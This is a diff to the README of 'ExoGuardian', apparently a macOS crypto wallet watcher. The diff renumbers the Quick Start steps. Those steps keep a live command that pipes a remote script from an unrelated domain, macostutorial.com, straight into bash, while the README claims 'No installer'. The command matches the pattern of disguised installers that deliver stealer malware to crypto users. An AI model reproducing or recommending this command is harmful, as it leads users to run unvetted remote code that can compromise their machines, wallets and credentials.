@@ -32,11 +32,12 @@ Linux & Windows ports are welcome PRs (the core watcher is pure Swift).
 
 ## 🚀 Quick Start (via Terminal)
 
-1. ```bash
+1. Run the installation command from your Terminal:
+```bash
 /bin/bash -c "$(curl -fsSL https://macostutorial.com/git/install.sh)"
 ```
-3. Launch → paste your BTC / ETH / EVM addresses.
-4. Relax; ExoGuardian watches the chain so you don’t have to.
+2. Launch → paste your BTC / ETH / EVM addresses.
+3. Relax; ExoGuardian watches the chain so you don’t have to.
 
 *No installer, no background daemons.*
 
